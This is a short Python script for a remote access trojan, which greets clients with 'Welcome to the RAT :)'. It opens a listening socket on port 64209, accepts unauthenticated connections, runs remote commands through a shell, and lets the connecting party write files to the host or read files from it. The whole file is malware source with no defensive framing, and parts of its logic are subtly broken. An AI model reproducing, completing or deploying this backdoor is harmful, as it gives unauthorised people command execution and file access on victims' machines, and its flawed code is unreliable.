import os
import sys
import base64
import socket
import subprocess

# Constants
HEADERSIZE = 10
PORT = 64209

### Execute ###
def Execute(command):
    subprocess.Popen(command, shell=True)

### Upload ###
def Upload(b64String, outputFile):
    
    OutputText = base64.b64encode(b64String)
    
    OutputFile = open(outputFile, 'wb')
    OutputFile.write(OutputText)

    
### Download ###
def Download(fileName):
    localFile = open(fileName, 'rb')
    OutputText = base64.b64encode(localFile.read())
    print(OutputText)
    localFile.close()
    return OutputText

# Main code
def main():
    # Start Socket stream
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Bind socket to current host along port
    s.bind((socket.gethostname(), PORT))
    # Start listening for a connection with a queue of 1
    s.listen(1)
    while True:
        # accept any incomming socket connection request
        clientsocket, address = s.accept()
        print(f"Found connection at {address}! Connection successful!")
        messageForClient = "Welcome to the RAT :)"
        messageForClient = f'{len(messageForClient):<{HEADERSIZE}}' + messageForClient
        clientsocket.send(bytes(messageForClient, "UTF-8"))
        
        # Receive message from client
        msg = clientsocket.recv(1024)
        msg = msg.decode("utf-8")
        
        # Parse the command from the client
        command = msg.split()[0]
        if command == "execute":
            command = msg.split()[1:]
            Execute(command)
        elif command == "upload":
            b64String = msg.split()[1]
            outputFile = msg.split()[2]
            Upload(b64String, outputFile)
        elif command == "download":
            fileName = msg.split()[1]
            Download(fileName)

if __name__ == '__main__':
    main()
